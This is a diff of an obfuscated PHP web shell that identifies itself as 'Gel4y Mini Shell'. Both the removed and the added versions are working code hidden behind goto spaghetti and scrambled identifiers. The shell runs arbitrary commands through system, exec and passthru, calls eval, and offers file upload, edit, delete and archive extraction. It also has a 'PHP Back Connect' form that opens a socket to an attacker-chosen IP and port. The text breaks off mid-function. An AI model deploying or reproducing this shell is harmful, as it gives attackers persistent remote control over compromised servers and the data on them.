@@ -1,133 +1,1152 @@
 <?php
- goto s9u9_ni4xe; nx4H_osQzp: Dz60W6jbh8: goto TyFYUmAEq5; L8TjZe_v0G: ?></span>
-<div class="form-group"><label for="ctn">Content :</label><textarea id="ctn" cols="30" rows="10" class="form-control" readonly><?php  goto DX625eVwS2; CjHzdcIpw4: ?>
-    <?php  goto SyWsbjzw2B; k1DnvpA5gF: if (!in_array($uuT42WnhRN[$vjeKX6vmt9], $NsqshqwBsc)) { goto f5V4SeQe60; } goto d5NCtpmmne; b3FZnFQPFt: if ($gAAylQtr2x == 'view') { goto X94ON33i95; } goto LWpw7tFZAk; AfOhj0UgbP: goto F5zzwsOrwM; goto T0ShNahMsS; TVW0zWduYC: echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . wHagu3ZQsi($_POST["cmd"]) : ""; goto Pqd0zB58gx; LlS32zgNke: goto SxcAwFEBKX; goto KlOPnfptF3; tf_GYYPDNs: goto Nu23wv6Cuk; goto DtJAkM2NdT; exXW1ff1ej: echo htmlspecialchars(file_get_contents($I_lN09c7SW . '/' . Scod165Rr2($_GET["n"]))); goto oHjPWHLCJ8; GAnbK2Gu_o: if ($gAAylQtr2x == 'edit') { goto NpedkrNY5l; } goto sSV9jj5ONY; S2DrRYDFeJ: echo '</div>'; goto X5vp9ETlF5; RXpQHWwJtA: if (isset($_GET['l'])) { goto D5xQkaqN6L; } goto hAfMRrdZSP; Pt9UAQTj13: if ($CwSBQX1tlw != 0) { goto yJvJoa_rQx; } goto vs2fVqZPc7; ZoGfj_hn2i: $RFJjcUG5Gt->extractTo(basename($hNee7BwYVM[$vjeKX6vmt9], '.zip')); goto QwV5y1setZ; Hxxc32aPGE: if (!isset($_GET["a"])) { goto N2NcOymve_; } goto lPgHZmpYMg; SyWsbjzw2B: if ($gAAylQtr2x == "con") { goto XToGaMZfBf; } goto P0yX4k6fYm; ck01LmK9wz: ?>" class="form-control">
-  <input type="number" name="port" placeholder="<?php  goto I4QrGGydqc; ueI6__rUxY: YP4sAQJU9f: goto ZDyElMZQmF; vYlc0DQeYv: @fwrite($Fpn18PJz_d, "\n" . wHAGu3Zqsi($VeG3fnVpnw) . "\n\n"); goto g0W1Ju8B27; d5NCtpmmne: $RFJjcUG5Gt = new ZipArchive(); goto mFN0sccJhQ; lebg1dTG9A: goto ORqp0RHsir; goto ubggL2f1oi; RbtICqnK6J: foreach ($kMin7PhsG_ as $LUUf7MY0af => $Aco71nSfAj) { goto K9i5nUPtq4; i5XzUdXX0Z: $vjeKX6vmt9++; goto C3LZiCR3_i; wNPNUHWJGy: if (!($vjeKX6vmt9 != $LUUf7MY0af)) { goto c8tMyfyTG9; } goto qj9udYt_6J; Yu3S8os5Nq: D2s1AfZX6i: goto pNzUW6Gwn2; CLYNLODOnd: if (!($Aco71nSfAj == "")) { goto D2s1AfZX6i; } goto uH367GWfVl; G_PkRy6bi4: W0Hn_70_c3: goto RZLu5V3sJT; TSwMjydgXx: tXF9aIpjQQ: goto CLYNLODOnd; uH367GWfVl: goto W0Hn_70_c3; goto Yu3S8os5Nq; pNzUW6Gwn2: echo "<a href=\"?l="; goto w9om4cDEPl; K9i5nUPtq4: if (!($LUUf7MY0af == 0 && $Aco71nSfAj == "")) { goto tXF9aIpjQQ; } goto HA81wKzfTX; w9om4cDEPl: $vjeKX6vmt9 = 0; goto iPmhYRV5IU; pQJdpWTwd7: uULT0pjWL2: goto Z1y4YwxzT4; Z1y4YwxzT4: echo "\">{$Aco71nSfAj}</a>/"; goto G_PkRy6bi4; o9YucUL_yn: Mchswj2lgu: goto i5XzUdXX0Z; VDjc8KM1jD: c8tMyfyTG9: goto o9YucUL_yn; C3LZiCR3_i: goto KeezW0T_2H; goto pQJdpWTwd7; iPmhYRV5IU: KeezW0T_2H: goto dMVv5u3LzW; qj9udYt_6J: echo "2f"; goto VDjc8KM1jD; dMVv5u3LzW: if (!($vjeKX6vmt9 <= $LUUf7MY0af)) { goto uULT0pjWL2; } goto EUoNRxYJBI; Y2Cwy2NtsR: goto W0Hn_70_c3; goto TSwMjydgXx; EUoNRxYJBI: echo ScoD165Rr2($kMin7PhsG_[$vjeKX6vmt9], 0); goto wNPNUHWJGy; HA81wKzfTX: echo "<a href=\"?l=2f\">~</a>/"; goto Y2Cwy2NtsR; RZLu5V3sJT: } goto xZnIA30vwd; zh491hjpMe: $Fpn18PJz_d = fsockopen($elMz8LjgjN, $Hb2xi6CLoa, $CwSBQX1tlw, $q5jUdzyF0Y); goto Pt9UAQTj13; lYWHG190jR: $eKiFvQ2vHC = whAgu3zQsI('time'); goto INSDE3e0Og; qTOgQRiQRf: isset($_POST["s"]) ? file_exists("{$I_lN09c7SW}/{$_POST["n"]}") ? WVHimb1Xbo("file name has been used", scod165rR2($I_lN09c7SW, 0) . "&a=" . scOD165Rr2("cfile", 0), 0) : (file_put_contents("{$I_lN09c7SW}/{$_POST["n"]}", $_POST["ctn"]) ? wvhImb1xbO("file created successfully", sCoD165Rr2($I_lN09c7SW, 0) . "&a=" . ScoD165rR2("view", 0) . "&n=" . sCod165rR2($_POST["n"], 0)) : wVhImB1xBo("file failed to create", sCOd165Rr2($I_lN09c7SW, 0), 0)) : null; goto QSZBpPfN28; rN5UEpxXG0: ?>
-      </tbody>
-    </table>
-    <?php  goto KCB8Hmi5ow; TMx4zSNbwx: ?>
-      </div>
-    </div>
-    <article class="bg-dark border table-responsive">
-    <?php  goto ZhKBv1Iz3W; pcpGqYKxIS: Cb_9Ef9Dvf: goto iNLcphRy60; hAfMRrdZSP: $I_lN09c7SW = getcwd(); goto ocXYZDbAyt; RQHxIIj1cZ: f5V4SeQe60: goto w0SyngrYUd; cPKCcf7MR9: isset($_POST["s"]) ? rename($I_lN09c7SW . '/' . SCOd165RR2($_GET["n"]), $_POST["n"]) ? WVHImb1XBO("successfully changed the name", scOD165rR2($I_lN09c7SW, 0)) : wVHiMB1Xbo("failed to change the name", SCod165rr2($I_lN09c7SW, 0), 0) : null; goto JIkdCXtH17; iNLcphRy60: ?>
-    <h5>Command</h5>
-    <pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php  goto TVW0zWduYC; lPgHZmpYMg: $gAAylQtr2x = ScOD165rr2($_GET["a"]); goto NOPki1VPRd; FF3jjGmujV: if ($gAAylQtr2x == "term") { goto Cb_9Ef9Dvf; } goto GAnbK2Gu_o; yu0QvRDrXG: isset($_POST["s"]) ? file_exists("{$I_lN09c7SW}/{$_POST["n"]}") ? WVhimb1XBO("folder name has been used", scOd165rR2($I_lN09c7SW, 0) . "&a=" . SCOD165rr2("cdir", 0)) : (mkdir("{$I_lN09c7SW}/{$_POST["n"]}") ? WvHiMB1xBo("folder created successfully", SCOd165Rr2($I_lN09c7SW . "/" . $_POST["n"], 0)) : wvhimB1Xbo("folder failed to create", scoD165rr2($I_lN09c7SW, 0), 0)) : null; goto T1UBhoC41_; ubggL2f1oi: Xo6cle392S: goto ySJeKYveVV; sSV9jj5ONY: if ($gAAylQtr2x == 'rename') { goto ItvXrc1MPf; } goto b3FZnFQPFt; r7MKcqXetT: fwrite($Fpn18PJz_d, 'User ', $s1OVK9lbWK, 'connected @ ', $eKiFvQ2vHC, "\n\n"); goto shAzs1kguU; G2kpOd1WrM: $vjeKX6vmt9 = 0; goto m8SfLGjd02; rTQ20f4P4n: unlink($jQm7oyW4Qu); goto Zt4_Ja_dmq; FMHj1HdkPm: ?>"><i class="fa fa-plus"></i><i class="fa fa-folder"></i></a> |
-          <a href="<?php  goto LuWToMYtnr; ysxCc13A4L: ?>
-    </div>
-    <?php  goto sNH2AjSsc9; t4YglQhiE5: echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})"; goto W6NY1sTvKY; jGF3noaFi0: Nu23wv6Cuk: goto DkoO5aHwEx; KCB8Hmi5ow: P3Hi2iwd1U: goto MMQV_0sye0; eePSHQiHXJ: if (!file_exists($jQm7oyW4Qu)) { goto Xo6cle392S; } goto eqMjYxDM2L; uI2vWciHOE: echo BYteAsdnoT; goto GOA9daq_pY; c0mwifDa50: ?>
-    <h5>View <?php  goto H4JBzu3vyj; Hgp6UtYbMT: ?></span>
-<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php  goto exXW1ff1ej; PAsjWvUaE8: echo $_SERVER["REMOTE_ADDR"]; goto ck01LmK9wz; kJxOA4IXhJ: $hNee7BwYVM = $_FILES['f']['name']; goto G2kpOd1WrM; o9PS4uYfjH: c8u9XhYh_Q: goto k1DnvpA5gF; DX625eVwS2: echo htmlspecialchars(file_get_contents($I_lN09c7SW . '/' . ScOd165rR2($_GET["n"]))); goto zHFMF9i2dl; rOBq0oetEF: $kMin7PhsG_ = preg_split("/(\\\\|\\/)/", $I_lN09c7SW); goto RbtICqnK6J; FBNnUH4b7H: WvhImb1Xbo("file deleted successfully", scOD165rr2($I_lN09c7SW, 0)); goto jGF3noaFi0; xZnIA30vwd: u4xi6_rkve: goto TMx4zSNbwx; oQBmms1zYb: $I_lN09c7SW = scoD165RR2($_GET['l']); goto l0VEWWoryp; UE8pM5OTuV: xBsgNP_qmX($jQm7oyW4Qu); goto eePSHQiHXJ; s9u9_ni4xe: define("BYteAsdnoT", "Gel4y Mini Shell"); goto RXpQHWwJtA; v0RE2SAi9i: ?>
-    <h5>Edit file</h5>
-    <span>File name : <?php  goto hThw1FAitG; TCSiM3MGpt: header("Content-Type: application/octet-stream"); goto GR4PSTwJoi; ZnAAx43Xnz: $elMz8LjgjN = $_POST['port']; goto zh491hjpMe; d56bXPkOvG: H5yuZJRAjS: goto uP3nEDF0Tt; zEi70zkzTd: if (!($gAAylQtr2x == "delete")) { goto KdWNo7AjqV; } goto hRufaLMoAj; fZPMa7C5AR: $uuT42WnhRN = $_FILES['f']['type']; goto ycQGAJ9rpW; g0W1Ju8B27: goto K5sIIxj_F3; goto bJHEdblZKU; OWUVT5Hc5g: function sCod165rr2($nhC875hiZm, $xHh5aDGVzW = true, $vjeKX6vmt9 = 0) { goto sfkjqKbPuW; DkMtNfaO35: $vjeKX6vmt9 += 2; goto eaBVgCN7DT; N1MTP5nE3J: $clfdCXlE6r .= chr(hexdec("{$nhC875hiZm[$vjeKX6vmt9]}{$nhC875hiZm[$vjeKX6vmt9 + 1]}")); goto QQlUco0bGy; Q9SR7IUbD4: XwKFq9PN3H: goto AptbdhXBJK; iN67ygIXj4: hHvcORMXt6: goto XJ34DXGbfW; QQlUco0bGy: CLasDIi50q: goto DkMtNfaO35; nvcr7Nt1hS: goto iiFaUFBjLs; goto HvHWsSysNA; OGUyjvgHuz: goto hHvcORMXt6; goto T4U27yRjQz; mhZ3B7d8Ao: iiFaUFBjLs: goto jR8ZYWzAe5; N740lbEyas: $clfdCXlE6r .= dechex(ord($nhC875hiZm[$vjeKX6vmt9])); goto Q9SR7IUbD4; XJ34DXGbfW: if (!($vjeKX6vmt9 < $yJTLlApkG3)) { goto KueXfd4Alx; } goto N740lbEyas; nUHUNQ2_7A: afo7jO332e: goto nvcr7Nt1hS; jR8ZYWzAe5: return $clfdCXlE6r; goto qMy68HqlIW; eaBVgCN7DT: goto P_69xj9gGk; goto nUHUNQ2_7A; T4U27yRjQz: KueXfd4Alx: goto mhZ3B7d8Ao; AptbdhXBJK: $vjeKX6vmt9++; goto OGUyjvgHuz; HvHWsSysNA: jexCLEsLzR: goto iN67ygIXj4; LWmmAs4bN0: if ($xHh5aDGVzW == false) { goto jexCLEsLzR; } goto UxQ_ffQhCJ; ESrG6JqjCA: $yJTLlApkG3 = strlen($nhC875hiZm); goto LWmmAs4bN0; UxQ_ffQhCJ: P_69xj9gGk: goto n0n3yqVYzA; n0n3yqVYzA: if (!($vjeKX6vmt9 < $yJTLlApkG3 - 1)) { goto afo7jO332e; } goto N1MTP5nE3J; sfkjqKbPuW: $clfdCXlE6r = ''; goto ESrG6JqjCA; qMy68HqlIW: } goto ZXVrkJoKku; XOFxDlRi7Q: $UA2QAI9Aou = WHAgu3zQsI('pwd'); goto a4ylo9zyoS; vtO6Mte_uT: goto F5zzwsOrwM; goto hZCBXjh5xa; zHFMF9i2dl: ?></textarea></div>
-    <?php  goto gG13wzHgsR; w0SyngrYUd: WVhIMB1Xbo("file uploaded successfully", SCOd165Rr2($I_lN09c7SW, 0)); goto IXOP4R0rfy; I4QrGGydqc: echo rand(1, 6) * 1922; goto LEdsfT_f5L; Z9dkzv793z: KiTWSOTYvH: goto rN5UEpxXG0; OeI0AYCWg5: wvHimB1xbo("file failed to upload", SCOD165Rr2($I_lN09c7SW, 0), 0); goto qpvqDxlak2; kfkPETDaAp: SxcAwFEBKX: goto Gjo1HTRnN2; mox6qQiktB: ?>
-    <h5>PHP Back Connect</h5>
-    <form method="post">
-    <div class="input-group mb-3">
-  <input type="text" name="ip" placeholder="<?php  goto PAsjWvUaE8; VjwIX64Qky: ?>"><i class="fa fa-plus"></i><i class="fa fa-file"></i></a> |
-          <a href="<?php  goto vpD6oLHWNu; FK22nGHGLF: if (!isset($_GET["download"])) { goto qxwiPIxTUE; } goto TCSiM3MGpt; BrCC99QmZj: goto KQLt0D0U6k; goto XRfaw0lEpa; lHTV2LHwsZ: $VeG3fnVpnw = fgets($Fpn18PJz_d, $yJTLlApkG3); goto vYlc0DQeYv; shAzs1kguU: K5sIIxj_F3: goto LwTnKrb2gA; z80W2Hg6XW: ?>"><i class="fa fa-usb"></i></a> |
-          <a href="<?php  goto Yy5ei4krjv; vs2fVqZPc7: if (!$Fpn18PJz_d) { goto JN0mJFE3Bn; } goto LlS32zgNke; ur1ttufF6K: JN0mJFE3Bn: goto tB9vZK2Qir; YPRTSligfx: goto F5zzwsOrwM; goto r1bYIhfphm; Jm3tyWVk1H: ?>
+goto YYviAIE2go;
+DMDVAvNxme:
+$j6fm9JkXX3 = new ZipArchive();
+goto iQnuU7UbQZ;
+YtyLK4CiZm:
+lXPtdPwHZr:
+goto CAzQINwyXp;
+uuEMYRcWJf:
+?>" class="form-control">
+</div>
+<div class="form-group">
+<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
+</div>
+</form>
+<?php
+goto DKCCjxBaV1;
+FrJD9Jsque:
+echo php_uname();
+goto MMrXTvXqy7;
+f3YaO_36Gp:
+b_Aq_femsk:
+goto kI2aFVtVVe;
+CAzQINwyXp:
+eCbgD8Xa7G:
+goto tJJFzbSKwD;
+tRwrGXooF4:
+isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? BB5iNvUgyh("file name has been used", rxeFBN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXefbN6HEy("cfile", 0), 0) : (file_put_contents("{$EEfZ6TZDdb}/{$_POST["n"]}", $_POST["ctn"]) ? Bb5inVUGYh("file created successfully", rXeFBN6heY($EEfZ6TZDdb, 0) . "&a=" . rXEFBn6HEy("view", 0) . "&n=" . RXeFbn6heY($_POST["n"], 0)) : Bb5invUgYh("file failed to create", rxEFBN6HEy($EEfZ6TZDdb, 0), 0)) : null;
+goto MOs0Lw2QRZ;
+qRqOKZqPSD:
+echo rxeFBn6hEy($_GET["n"]);
+goto P7K6f8_xHe;
+knjkHswo6U:
+if (!($j78MPlSKil == true)) {
+goto lXPtdPwHZr;
+}
+goto fV1xJLciE1;
+dFM2sYAJlJ:
+header("Content-Length: " . strtotime(Rxefbn6hey($_GET["n"])));
+goto MTQ6j3p_JU;
+FFNAjFboph:
+Bip4SkFlwd:
+goto pLaaRpww2m;
+Pgo80visnY:
+$Dbi_h94n09 = $_FILES['f']['type'];
+goto wdy3Z2bJG6;
+wdy3Z2bJG6:
+$jzgT5WmvBi = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
+goto ynEoAvZ7Ef;
+EY59hEhqcL:
+$IKiphkRa67 = 0;
+goto nNXfQ4ODK4;
+pd2Xp8eNUU:
+function rxefBN6hEy($D9W0v0K2q3, $b5rceFkfVX = true, $IKiphkRa67 = 0) {
+goto e8KaQn3Obp;
+efhwre2vrg:
+goto UWZW4tv7l3;
+goto EThfiMKXfe;
+SXUX6z3P3K:
+if (!($IKiphkRa67 < $OI03NhJ2Yv - 1)) {
+goto ofW6zrTBdf;
+}
+goto VYWlS3nOx0;
+aPqRRotZs7:
+if ($b5rceFkfVX == false) {
+goto wOYeLPzegZ;
+}
+goto XT9k8Als00;
+cdda9BMGIp:
+if (!($IKiphkRa67 < $OI03NhJ2Yv)) {
+goto scQ2ws4J9b;
+}
+goto RLaX7avg7R;
+Em1B6VAcvW:
+wOYeLPzegZ:
+goto tSFsOi93Pc;
+e8KaQn3Obp:
+$FMsfhj9eNN = '';
+goto YBvZCMvcoQ;
+Rnp6XxBU71:
+goto hcWSNAsNnn;
+goto cD0EopBgMr;
+tSNU_V8RLN:
+ksnrAMe13N:
+goto mVE3hfoO3d;
+mVE3hfoO3d:
+$IKiphkRa67 += 2;
+goto efhwre2vrg;
+yBu1sPMOO9:
+zdNGAHnz2I:
+goto GuXCE9we3H;
+GuXCE9we3H:
+return $FMsfhj9eNN;
+goto ZQKmM0ZO1z;
+Bs8OEHOqrR:
+$IKiphkRa67++;
+goto Rnp6XxBU71;
+zOx24N5WZG:
+p9qfiI3280:
+goto Bs8OEHOqrR;
+XT9k8Als00:
+UWZW4tv7l3:
+goto SXUX6z3P3K;
+cD0EopBgMr:
+scQ2ws4J9b:
+goto yBu1sPMOO9;
+VYWlS3nOx0:
+$FMsfhj9eNN .= chr(hexdec("{$D9W0v0K2q3[$IKiphkRa67]}{$D9W0v0K2q3[$IKiphkRa67 + 1]}"));
+goto tSNU_V8RLN;
+EThfiMKXfe:
+ofW6zrTBdf:
+goto tqfBTI4VQk;
+RLaX7avg7R:
+$FMsfhj9eNN .= dechex(ord($D9W0v0K2q3[$IKiphkRa67]));
+goto zOx24N5WZG;
+tqfBTI4VQk:
+goto zdNGAHnz2I;
+goto Em1B6VAcvW;
+tSFsOi93Pc:
+hcWSNAsNnn:
+goto cdda9BMGIp;
+YBvZCMvcoQ:
+$OI03NhJ2Yv = strlen($D9W0v0K2q3);
+goto aPqRRotZs7;
+ZQKmM0ZO1z:
+}
+goto ZNQuKDPR_4;
+vhjTMlZILs:
+?>
+<h5>Command</h5>
+<pre class="border bg-info p-2"><i class="fa fa-terminal"></i> <?php
+goto LHKm105Km7;
+nRad7u_84k:
+UVK2cx0wsu:
+goto P3l6Ot_Nq2;
+Pb_Plr8szn:
+isset($_POST["s"]) ? file_exists("{$EEfZ6TZDdb}/{$_POST["n"]}") ? Bb5INvugYh("folder name has been used", rxefbn6hEy($EEfZ6TZDdb, 0) . "&a=" . rxefBn6hey("cdir", 0)) : (mkdir("{$EEfZ6TZDdb}/{$_POST["n"]}") ? bB5iNVUGyH("folder created successfully", RxeFbN6HEy($EEfZ6TZDdb . "/" . $_POST["n"], 0)) : BB5InvUgYH("folder failed to create", RxEfBN6hEy($EEfZ6TZDdb, 0), 0)) : null;
+goto EdwYtsCOvQ;
+xezzXbZ0n3:
+echo $_GET["t"] == "d" ? "folder" : "file";
+goto X31kOqdTx7;
+egAEX13geb:
+?>
+<h5>View file</h5>
+<span>File name : <?php
+goto d5oIa6c6mo;
+e1DVBPK5MZ:
+AmZ_WHgxlE:
+goto QiVggpWdug;
+kPuh3sB7ZW:
+bLvI_Fu3sF:
+goto NIDHY8CumR;
+WX3PBtaAK3:
+LEIHIpts4n:
+goto p59Ko9RToC;
+pzkU10IQiS:
+iqfV5KrODo:
+goto DSgJ4EEwOL;
+U6RgZiR5iP:
+foreach ($fgiEl2SFA1 as $GH5ltOv09p) {
+goto NGJBE3_QDg;
+fnleygjPy5:
+goto Hr0waR6BpO;
+goto OOFzGy7x36;
+OOFzGy7x36:
+jCLJ3kfZ8a:
+goto kd_ict3juy;
+NGJBE3_QDg:
+if (is_dir("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) {
+goto jCLJ3kfZ8a;
+}
+goto fnleygjPy5;
+kd_ict3juy:
+echo "<tr>\n          <td><a href=\"?l=" . RxefBN6hEY("{$EEfZ6TZDdb}/{$GH5ltOv09p}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) == 0 ? "" : "-open") . " text-warning\"></i> {$GH5ltOv09p}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$EEfZ6TZDdb}/{$GH5ltOv09p}") ? "#00ff00" : (!is_readable("{$EEfZ6TZDdb}/{$GH5ltOv09p}") ? "red" : null)) . "\">" . hRXkAtTukJ("{$EEfZ6TZDdb}/{$GH5ltOv09p}") . "</font></td>\n          <td>\n            <a href=\"?l=" . rXeFbN6HEy($EEfZ6TZDdb, 0) . "&a=" . rxeFBn6HEy("rename", 0) . "&n=" . rXEFbN6Hey($GH5ltOv09p, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . RxEfBn6hEY($EEfZ6TZDdb, 0) . "&a=" . RxefbN6hey("delete", 0) . "&n=" . rxEFbn6HEy($GH5ltOv09p, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>";
+goto zfUgYAH3MQ;
+zfUgYAH3MQ:
+Hr0waR6BpO:
+goto Pn1401P2iD;
+Pn1401P2iD:
+}
+goto dNAXwyF5jm;
+Hqjr9ld8se:
+$IKiphkRa67++;
+goto d0z8uX0wp2;
+MWacVfk2Z9:
+echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})";
+goto cCui051SEu;
+L3Ih6C_82z:
+$EEfZ6TZDdb = getcwd();
+goto HD1w0oiEBZ;
+pQ3h2CEIaE:
+yLxrotraE3:
+goto deRzU3bq7h;
+zvl7rFBRXM:
+echo phpversion();
+goto OyonV_aXfE;
+zoc5HXXlKd:
+if (!($hzOvuJeFzz == "delete")) {
+goto a570kYKgnw;
+}
+goto HAtVYbHdyo;
+jP2j_WsoIN:
+$fgiEl2SFA1 = array_diff(scandir($EEfZ6TZDdb), ['.', '..']);
+goto U6RgZiR5iP;
+d0z8uX0wp2:
+goto et0KZW4bvS;
+goto DYX5ofDNkJ;
+JxeppvOhkj:
+mqgxd0ffd7:
+goto EfxIdbdntP;
+t5hyi0WMXW:
+?>
+<div class="px-2 py-2">
+<?php
+goto zoc5HXXlKd;
+TGAVCVIxJL:
+isset($_POST["s"]) ? rename($EEfZ6TZDdb . '/' . rXEFbn6heY($_GET["n"]), $_POST["n"]) ? bB5invUGyH("successfully changed the name", rxEfbn6hey($EEfZ6TZDdb, 0)) : Bb5iNvugyh("failed to change the name", RXEfbn6HEY($EEfZ6TZDdb, 0), 0) : null;
+goto dbYRcKsPIp;
+qvSYZCVNk0:
+Q0WFVkujRs($IqAFWYu448);
+goto FM1zySo56b;
+NIDHY8CumR:
+a570kYKgnw:
+goto gQ0uxJM3IM;
+fpFzgy_AKw:
+unlink($IqAFWYu448);
+goto wKFr1pnzc8;
+LHKm105Km7:
+echo isset($_POST["cmd"]) ? $_POST["cmd"] . "<br>" . ZiODPz7nrE($_POST["cmd"]) : "";
+goto MvSZRFs0SS;
+jz_2zEOwzt:
+if (!isset($_FILES['f'])) {
+goto CYI57kgQJP;
+}
+goto Kf_pWcks49;
+IVRDMHFY4o:
+?></span>
+<form method="post">
+<div class="form-group">
+<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?php
+goto s00fzLO5Yl;
+jt5neMFYv3:
+CYI57kgQJP:
+goto h3GEWWTVgD;
+WQ5FRO1vHE:
+?></textarea>
+</div>
+<?php
+goto uTadf7sHfn;
+pqYY95BvuW:
+eval($rRwNpSflmI);
+goto Y2JbRwIzN2;
+DKCCjxBaV1:
+if (!isset($_POST['s'])) {
+goto lgFAN1_7Jm;
+}
+goto vTj5YprhCZ;
+gsi4neWUGA:
+if ($hzOvuJeFzz == "term") {
+goto N64OxnT9Bh;
+}
+goto d6E_B1kiXH;
+mwiid_zmqA:
+?>
+</tbody>
+</table>
+<?php
+goto Ms3mPsNEFz;
+errh3t4_bj:
+?>" class="form-control">
+<input type="number" name="port" placeholder="<?php
+goto BhKgAwcXlI;
+vaea2TNc3W:
+?>
+<?php
+goto ZPaDeX38qY;
+GOgo5L4_m1:
+echo '</div>';
+goto uLfgP7Khd1;
+GBMZg5FNn5:
+$EEfZ6TZDdb = RxEfBN6HEy($_GET['l']);
+goto AxYV08ef23;
+QiVggpWdug:
+function ZiOdpZ7NRe($uzNaDUYhmE) {
+goto S3Qzf1dQtJ;
+YwzdjcDHzZ:
+return $GpjllTmONM;
+goto C5BvoqV0QO;
+EEr5NKol9z:
+return $GpjllTmONM;
+goto JpNyWf38OC;
+Md0hXovAWp:
+if (function_exists('LO04lRpWK3')) {
+goto ZL1i5x7vAp;
+}
+goto F3aPZv7Ivq;
+RV4_cwKVfM:
+@ob_end_clean();
+goto YwzdjcDHzZ;
+DD2lPqxmMz:
+@ob_start();
+goto hZKcepEUr9;
+ARCEi82gDd:
+xxrteaxnDp:
+goto mrrLrvO2_2;
+F3aPZv7Ivq:
+goto Aa1Xj7bvHV;
+goto xvdvg7ah0M;
+wTnu9rrS0b:
+if (function_exists('passthru')) {
+goto LWJqpq8yIR;
+}
+goto Md0hXovAWp;
+w0M1Hs2RaI:
+if (function_exists('exec')) {
+goto xxrteaxnDp;
+}
+goto wTnu9rrS0b;
+lYPPssvZnN:
+return $GpjllTmONM;
+goto o2xGbbbn7p;
+l7Sy_e2gNs:
+aIlXKUa38m:
+goto wqKjdERcuI;
+XSHObW431y:
+$GpjllTmONM = @ob_get_contents();
+goto RV4_cwKVfM;
+o2xGbbbn7p:
+goto Aa1Xj7bvHV;
+goto ARCEi82gDd;
+JpNyWf38OC:
+Aa1Xj7bvHV:
+goto ncZJ9fHIca;
+S3Qzf1dQtJ:
+if (function_exists('system')) {
+goto ShitZ_fqN0;
+}
+goto w0M1Hs2RaI;
+pmA_RXTG2H:
+foreach ($htHTK6yRnX as $DWC35O18yz) {
+$GpjllTmONM .= $DWC35O18yz;
+K7EykltkhG:
+}
+goto l7Sy_e2gNs;
+leFmMK27js:
+@ob_end_clean();
+goto lYPPssvZnN;
+kPjOic6Y0y:
+LWJqpq8yIR:
+goto DD2lPqxmMz;
+C5BvoqV0QO:
+goto Aa1Xj7bvHV;
+goto Gj6CvS2ymR;
+lqJmw679pi:
+$GpjllTmONM = '';
+goto pmA_RXTG2H;
+ZFOEwZlXbP:
+$GpjllTmONM = @ob_get_contents();
+goto leFmMK27js;
+hZKcepEUr9:
+@passthru($uzNaDUYhmE);
+goto XSHObW431y;
+mrrLrvO2_2:
+@exec($uzNaDUYhmE, $htHTK6yRnX);
+goto lqJmw679pi;
+wqKjdERcuI:
+return $GpjllTmONM;
+goto gBHH0bU_b0;
+UwvldCMoKq:
+@ob_start();
+goto g2B36laNqw;
+Gj6CvS2ymR:
+ZL1i5x7vAp:
+goto BQbLSRTLBg;
+g2B36laNqw:
+@system($uzNaDUYhmE);
+goto ZFOEwZlXbP;
+xvdvg7ah0M:
+ShitZ_fqN0:
+goto UwvldCMoKq;
+BQbLSRTLBg:
+$GpjllTmONM = @lO04lrpWK3($uzNaDUYhmE);
+goto EEr5NKol9z;
+gBHH0bU_b0:
+goto Aa1Xj7bvHV;
+goto kPjOic6Y0y;
+ncZJ9fHIca:
+}
+goto LcspiVxgnz;
+se4fG1bBsx:
+ji_iynjOca:
+goto mwiid_zmqA;
+Y2JbRwIzN2:
+echo 'Finished...';
+goto GOgo5L4_m1;
+uZLJEXNBXC:
+foreach ($fgiEl2SFA1 as $rn5LpfN5ed) {
+goto TPhDQkESfw;
+jS1wS_J3NZ:
+$nWFrSLIRip = $nWFrSLIRip > 1024 ? round($nWFrSLIRip / 1024, 2) . "MB" : $nWFrSLIRip . "KB";
+goto s4ZD82W7si;
+TPhDQkESfw:
+if (is_file("{$EEfZ6TZDdb}/{$rn5LpfN5ed}")) {
+goto r7XRlRbOPb;
+}
+goto vv8Mn2Xk4q;
+vv8Mn2Xk4q:
+goto klWD96HxTP;
+goto toECwsZyAp;
+toECwsZyAp:
+r7XRlRbOPb:
+goto evSeCa9Ebj;
+TfHb3SJszc:
+$nWFrSLIRip = round($nWFrSLIRip, 3);
+goto jS1wS_J3NZ;
+oNCyMMeqOT:
+klWD96HxTP:
+goto rv2fcrMmui;
+evSeCa9Ebj:
+$nWFrSLIRip = filesize("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") / 1024;
+goto TfHb3SJszc;
+s4ZD82W7si:
